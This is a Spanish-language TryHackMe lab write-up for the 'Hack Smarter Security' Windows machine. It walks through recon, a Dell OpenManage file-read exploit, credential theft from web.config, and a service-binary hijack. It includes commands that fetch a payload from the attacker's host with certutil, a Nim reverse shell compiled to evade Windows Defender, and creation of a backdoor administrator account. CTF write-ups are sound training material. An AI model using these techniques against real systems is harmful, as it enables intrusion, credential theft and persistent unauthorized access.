---
title: Hack Smarter Security
date: 2025-03-13
categories: [WRITEUPS, TryHackMe]
tags: [Windows, nim]  # TAG names should always be lowercase
image: /assets/images/tryhackme/logo.png
---

![picture](/assets/images/tryhackme/hacksmarter1.png)

En la máquina **Hack Smarter Security** de dificultad media de **TryHackMe**, exploto un panel **Dell OpenManage Server Administrator**, por la cual se puede realizar un bypass de autenticación y la capacidad de leer archivos, gracias a esto obtengo claves de **ssh**, y escalo privilegios por la explotación de un servicio llamado **spoofer-scheduler**.

---

En este ***Writeup*** se engloban las siguientes fases:

- **[Reconocimiento](#reconocimiento)**

- **[Explotación](#explotación)**

- **[Escalada de privilegios](#escalada-de-privilegios)**

---
## **Reconocimiento**

Lo primero que realizo es un escaneo de puertos con `nmap`, para comprobar que puertos tiene abiertos, y que servicios están corriendo por los puertos.

```bash
nmap -p- --open --min-rate 5000 10.10.130.2 -n -Pn -oN allPorts
```

![picture](/assets/images/tryhackme/hacksmarter2.png)

Realizo un escaneo sobre los puertos encontrados para determinar la versión de los servicios, y lanzar una serie de scripts predeterminados de `nmap`.

```bash
nmap -p21,22,80,1311,3389 -sVC 10.10.130.2 -oN targeted
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 20:45 CET
Nmap scan report for 10.10.130.2
Host is up (0.046s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: HackSmarterSec
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
1311/tcp open  ssl/rxmon?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Tue, 11 Mar 2025 19:45:11 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Tue, 11 Mar 2025 19:45:16 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-11T19:45:24+00:00
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2025-03-10T19:37:28
|_Not valid after:  2025-09-09T19:37:28
|_ssl-date: 2025-03-11T19:45:28+00:00; -40s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.95%T=SSL%I=7%D=3/11%Time=67D092EF%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:
SF:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20acc
SF:ept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Tu
SF:e,\x2011\x20Mar\x202025\x2019:45:11\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Str
SF:ict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\
SF:r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=
SF:\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\
SF:n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/lo
SF:ginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x2
SF:0type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=
SF:\"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\"/o
SF:ma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type
SF:=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javas
SF:cript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTTPOp
SF:tions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20max-a
SF:ge=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x20no
SF:sniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-encod
SF:ing\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Tue,\x2011\
SF:x20Mar\x202025\x2019:45:16\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCT
SF:YPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//EN\"
SF:\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<html>
SF:\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text/ht
SF:ml;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link\x2
SF:0type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmaster
SF:\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=\"t
SF:ext/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"javascr
SF:ipt\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/gna
SF:vbar\.js\"\x20language=\"javascript\"></script><script\x20type=\"text/j
SF:avascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\"><
SF:/script><script\x20language=\"javascript\">\r\n\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Lo primero que voy a revisar es el servicio `ftp`, ya que el usuario **anonymous** está habilitado, donde encuentro un archivo de texto y una imagen, los cuales me descargo con `mget *`.

![picture](/assets/images/tryhackme/hacksmarter3.png)

En el archivo de texto, encuentro 100 tarjetas de crédito.

![picture](/assets/images/tryhackme/hacksmarter4.png)

La imagen no muestra nada, y si le paso el comando `file`, me indica que el archivo contiene datos, llego a la conclusión de que el contenido del archivo está corrupto.

![picture](/assets/images/tryhackme/hacksmarter5.png)

En el navegador no encuentro nada interesante sobre la web del servicio `http`.

![picture](/assets/images/tryhackme/hacksmarter6.png)

Pero si me voy al contenido de la dirección `https://10.10.130.2:1311` encuentro lo siguiente.

![picture](/assets/images/tryhackme/hacksmarter7.png)

**Dell OpenManage Server Administrator**  (OMSA) es un conjunto de herramientas de administración de servidores desarrolladas por **Dell** para gestionar, monitorear y automatizar tareas en servidores **PowerEdge** y otros productos Dell EMC.

Justo en la parte de abajo-derecha del recuadro, encuentro "**Acerca de**", si clico me lleva a una página nueva en la que puedo ver la versión del servicio.

![picture](/assets/images/tryhackme/hacksmarter8.png)

---
## **Explotación**

Buscando en internet encuentro el siguiente blog donde explica las vulnerabilidades encontradas durante un **pestenting**, incluyendo `CVE-2020-5377` y `CVE-2021-21514`.
El autor detalla una vulnerabilidad de bypass de autenticación y lectura de archivos en las versiones de OMSA `9.4.0.0` y `9.4.0.2`. [rhinosecuritylabs.com](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/)

En el siguiente enlace de [Github](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514) se encuentra el PoC de la vulnerabilidad, así que me la voy a descargar para ejecutarla.

Nos pide nuestra dirección **IP**, la del servidor y su puerto.

![picture](/assets/images/tryhackme/hacksmarter9.png)

Introduzco los datos, lo ejecuto y al cabo de un rato podemos ver que nos pide un archivo para leer.

![picture](/assets/images/tryhackme/hacksmarter10.png)

Intento leer el archivo **hosts** para ver que funciona, y compruebo que saca el contenido del archivo.

```bash
C:\Windows\System32\drivers\etc\hosts
```

![picture](/assets/images/tryhackme/hacksmarter11.png)

Al tener habilitado tanto `rdp` como `ssh`, la idea es encontrar credenciales para obtener acceso a la máquina.

Intento leer el archivo de configuración general del sitio `IIS` cuya ruta es `C:\Windows\System32\inetsrv\config\applicationHost.config`.

Y puedo ver donde se encuentra la ruta del servidor web.

![picture](/assets/images/tryhackme/hacksmarter12.png)

Llegado a este punto, sabiendo la ruta del servidor, puedo intentar listar el contenido del archivo de configuración del servidor `web.config`

Lo listo y encuentro unas credenciales de un usuario llamado **tyler**.

![picture](/assets/images/tryhackme/hacksmarter13.png)

Intentando acceder mediante el servicio `ssh`, obtengo acceso con las credenciales encontradas.

![picture](/assets/images/tryhackme/hacksmarter14.png)

Listando todos los archivos con extensión `txt` en el directorio de **tyler**, encuentro la flag del usuario.

```bash
dir /s /b C:\Users\tyler\*.txt
```

![picture](/assets/images/tryhackme/hacksmarter15.png)

---
## **Escalada de privilegios**

Me paso a la máquina víctima el binario de `winPEASany.exe` para intentar listar vías de explotación para la escalada de privilegios.

- Host
	
	```bash
	python3 -m http.server 1234
	```

- Máquina víctima
	
	```bash
	certutil -urlcache -f http://<Nuestra IP>:1234/winPEASany.exe winPEASany.exe
	```

Cambio a una `powershell`, lo ejecuto, y me sale el siguiente error ya que está activado el `Windows Defender` y me lo está bloqueando.

![picture](/assets/images/tryhackme/hacksmarter16.png)

Listando los procesos actuales, encuentro uno que me llama la atención por el nombre, ya que `spoofing` es una técnica utilizada para "falsificar" información.

![picture](/assets/images/tryhackme/hacksmarter17.png)

Viendo la configuración del servicio, compruebo donde está la ruta del binario que se ejecuta cuando se inicia el servicio. `START_TYPE 2` significa que el servicio se inicia cuando arranca `Windows`.

![picture](/assets/images/tryhackme/hacksmarter18.png)

A continuación, compruebo si tengo permisos de escritura en el directorio donde se encuentra el ejecutable, para ello creo un archivo de prueba.

![picture](/assets/images/tryhackme/hacksmarter19.png)

También compruebo si puedo parar y volver a ejecutar el servicio.

- Parar el servicio
	
	```powershell
	sc.exe stop spoofer-scheduler
	```
	
	![picture](/assets/images/tryhackme/hacksmarter20.png)

- Iniciar el servicio
	
	```powershell
	sc.exe start spoofer-scheduler
	```
	
	![picture](/assets/images/tryhackme/hacksmarter21.png)

Al intentar crear un ejecutable para entablar una `Reverse Shell` con `msfvenom`, como el `Windows Defender` está activo, ha bloqueado el servicio al encontrar código malicioso y he tenido que reiniciar la máquina.

Voy a utilizar `nim` para compilar una `Reverse Shell` evadiendo el `Windows Defender`, para ello me descargo la `Reverse Shell` del siguiente repositorio de [Github](https://raw.githubusercontent.com/Sn1r/Nim-Reverse-Shell/refs/heads/main/rev_shell.nim), y la modifico cambiando mi dirección `IP` y `Puerto`.

Compilamos con `nim`.

```bash
nim c -d:mingw --app:gui --opt:speed -o:spoofer-scheduler.exe rev_shell.nim
```

![picture](/assets/images/tryhackme/hacksmarter22.png)

Modifico el nombre del archivo en el servidor `Windows`.

![picture](/assets/images/tryhackme/hacksmarter23.png)

Y me traigo el ejecutable compilado con `nim` en mi máquina local, abriendo un servidor `http` con `python3`.

- Host
	
	```python
	python3 -m http.server 1234
	```

- Servidor Windows
	
	```bash
	certutil -urlcache -f http://<IP>:1234/spoofer-scheduler.exe spoofer-scheduler.exe
	```

![picture](/assets/images/tryhackme/hacksmarter24.png)

Ahora abrimos un **listener** con `netcat` por el puerto que hemos puesto en la `nim Reverse Shell`, para que a la hora de volver a ejecutar el servicio nos la envíe.

```bash
nc -lnvp 4444
```

Paro el servicio, y al volver a correrlo se ejecuta el código.

![picture](/assets/images/tryhackme/hacksmarter25.png)

 Y obtengo una `shell` como **NT\AUTHORITY SYSTEM**.

![picture](/assets/images/tryhackme/hacksmarter26.png)

El problema viene cuando al cabo de unos segundos se cierra la conexión, ya que va a intentar iniciar el servicio muchas veces, pero como no va a conseguir hacerlo correctamente, se va a agotar el tiempo de espera.

Para poder tener persistencia, voy a crear un usuario nuevo y darle permisos de administrador antes de que se me cierre la conexión.

- Agregar usuario
	
	```powershell
net user pwned Password123 /add
	```
	
	![picture](/assets/images/tryhackme/hacksmarter27.png)

- Permisos de administrador
	
	```powershell
net localgroup administrators pwned /add
	```
	
	![picture](/assets/images/tryhackme/hacksmarter28.png)

Ahora me conecto mediante `ssh` con el usuario recientemente creado **pwned**.

![picture](/assets/images/tryhackme/hacksmarter29.png)

Listando los permisos del usuario compruebo que los tengo todos habilitados.

![picture](/assets/images/tryhackme/hacksmarter30.png)

Y puedo leer la *flag* final del usuario **Administartor**.

![picture](/assets/images/tryhackme/hacksmarter31.png)